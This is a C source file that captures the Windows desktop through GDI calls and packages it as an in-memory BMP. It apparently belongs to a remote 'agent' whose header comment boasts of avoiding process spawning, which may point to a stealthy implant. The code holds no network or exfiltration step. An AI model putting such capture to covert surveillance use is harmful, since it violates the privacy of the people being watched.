/*
 * screenshot.c — Desktop screenshot capture via GDI.
 *
 * No process spawning, no external tools. Pure Win32 GDI:
 *   GetDC(NULL) → CreateCompatibleDC → CreateCompatibleBitmap →
 *   BitBlt → GetDIBits → build BMP file in memory.
 */
#include "agent.h"
#include "screenshot.h"

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

BOOL screenshot_capture(const SCREENSHOT_OPTS *opts, SCREENSHOT_RESULT *result) {
    if (!result) return FALSE;
    memset(result, 0, sizeof(SCREENSHOT_RESULT));

    /* Get screen dimensions */
    int x, y, width, height;

    if (opts && opts->captureAll) {
        /* Full virtual desktop (all monitors) */
        x = GetSystemMetrics(SM_XVIRTUALSCREEN);
        y = GetSystemMetrics(SM_YVIRTUALSCREEN);
        width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    } else {
        /* Primary monitor only */
        x = 0;
        y = 0;
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
    }

    if (width <= 0 || height <= 0) {
        strncpy(result->errorMsg, "Failed to get screen dimensions", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    result->width = width;
    result->height = height;
    result->bpp = 32;

    /* Get the desktop DC */
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        strncpy(result->errorMsg, "GetDC(NULL) failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /* Create a compatible DC for the bitmap */
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    if (!hMemDC) {
        ReleaseDC(NULL, hScreenDC);
        strncpy(result->errorMsg, "CreateCompatibleDC failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /* Create a bitmap to hold the screenshot */
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        strncpy(result->errorMsg, "CreateCompatibleBitmap failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /* Select the bitmap into the memory DC */
    HGDIOBJ hOld = SelectObject(hMemDC, hBitmap);

    /* BitBlt the screen into our bitmap */
    if (!BitBlt(hMemDC, 0, 0, width, height, hScreenDC, x, y, SRCCOPY)) {
        SelectObject(hMemDC, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        strncpy(result->errorMsg, "BitBlt failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    SelectObject(hMemDC, hOld);

    /* Set up BITMAPINFOHEADER for 32-bit BMP */
    BITMAPINFOHEADER bi;
    memset(&bi, 0, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;  /* Negative = top-down (correct orientation) */
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;

    DWORD rowBytes = ((width * 32 + 31) / 32) * 4;  /* Row stride, 4-byte aligned */
    DWORD imageSize = rowBytes * height;

    /* Allocate pixel buffer */
    unsigned char *pixels = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, imageSize);
    if (!pixels) {
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);
        strncpy(result->errorMsg, "HeapAlloc for pixels failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /* Extract pixel data */
    int scanLines = GetDIBits(hScreenDC, hBitmap, 0, height,
                               pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    /* Clean up GDI objects */
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);

    if (scanLines == 0) {
        HeapFree(GetProcessHeap(), 0, pixels);
        strncpy(result->errorMsg, "GetDIBits failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /*
     * Build BMP file in memory:
     *   BITMAPFILEHEADER (14 bytes)
     *   BITMAPINFOHEADER (40 bytes)
     *   Pixel data
     */
    DWORD fileHeaderSize = 14;
    DWORD totalSize = fileHeaderSize + sizeof(BITMAPINFOHEADER) + imageSize;

    unsigned char *bmpFile = (unsigned char *)HeapAlloc(GetProcessHeap(), 0, totalSize);
    if (!bmpFile) {
        HeapFree(GetProcessHeap(), 0, pixels);
        strncpy(result->errorMsg, "HeapAlloc for BMP file failed", sizeof(result->errorMsg) - 1);
        return FALSE;
    }

    /* BITMAPFILEHEADER — manually write (avoid struct packing issues) */
    unsigned char *p = bmpFile;
    p[0] = 'B'; p[1] = 'M';                                    /* bfType */
    *(DWORD *)(p + 2) = totalSize;                               /* bfSize */
    *(WORD *)(p + 6) = 0;                                        /* bfReserved1 */
    *(WORD *)(p + 8) = 0;                                        /* bfReserved2 */
    *(DWORD *)(p + 10) = fileHeaderSize + sizeof(BITMAPINFOHEADER); /* bfOffBits */

    /* BITMAPINFOHEADER */
    /* Use positive height for BMP file format (bottom-up is standard) */
    BITMAPINFOHEADER biFile = bi;
    biFile.biHeight = height;  /* Positive = bottom-up (BMP standard) */
    biFile.biSizeImage = imageSize;
    memcpy(p + fileHeaderSize, &biFile, sizeof(BITMAPINFOHEADER));

    /*
     * Copy pixels — need to flip vertically since we captured top-down
     * but BMP file format is bottom-up.
     */
    unsigned char *dst = p + fileHeaderSize + sizeof(BITMAPINFOHEADER);
    for (int row = 0; row < height; row++) {
        /* Source row (top-down) maps to dest row (bottom-up) */
        int srcRow = row;
        int dstRow = height - 1 - row;
        memcpy(dst + dstRow * rowBytes, pixels + srcRow * rowBytes, rowBytes);
    }

    HeapFree(GetProcessHeap(), 0, pixels);

    result->data = bmpFile;
    result->dataLen = totalSize;

    return TRUE;
}

void screenshot_free(SCREENSHOT_RESULT *result) {
    if (!result) return;
    if (result->data) {
        SecureZeroMemory(result->data, result->dataLen);
        HeapFree(GetProcessHeap(), 0, result->data);
        result->data = NULL;
    }
    result->dataLen = 0;
}
